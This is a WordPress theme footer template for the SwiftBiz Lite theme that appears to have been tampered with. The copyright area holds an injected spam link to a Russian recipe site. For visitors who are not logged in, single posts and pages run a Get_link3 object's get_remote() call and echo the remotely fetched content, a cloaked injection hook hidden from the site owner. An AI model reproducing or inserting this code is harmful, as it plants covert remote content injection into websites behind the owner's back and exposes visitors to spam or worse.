<?php
/**
* The template for displaying the footer.
*
* Contains footer content and the closing of the
* #main and #page div elements.
*
*/
global $swiftbiz_lite_shortname, $swiftbiz_lite_themename;
?>
	<div class="clearfix"></div>
</div>
<!-- #main --> 

<!-- #footer -->
<div id="footer" class="swiftbiz-section">
	<div class="container">
		<div class="row-fluid">
			<div class="second_wrapper">
				<?php dynamic_sidebar( 'Footer Sidebar' ); ?>
				<div class="clearfix"></div>
			</div><!-- second_wrapper -->
		</div>
	</div>

	<div class="third_wrapper">
		<div class="container">
			<div class="row-fluid">
				<div class="copyright span6 alpha omega">
					<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://vkusnodoma.net/" title="просто и вкусно рецепты" target="_blank">вкусные рецепты</a> &ndash; <a href="http://www.sketchthemes.com/" target="_blank">SketchThemes</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_link3(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
				</div>
				
				<div class="clearfix"></div>
			</div>
		</div>
	</div><!-- third_wrapper --> 
</div>
<!-- #footer -->

</div>
<!-- #wrapper -->
<a href="JavaScript:void(0);" title="<?php _e('Back To Top','swiftbiz-lite'); ?>" id="backtop"></a>

<?php wp_footer(); ?>
</body>
</html>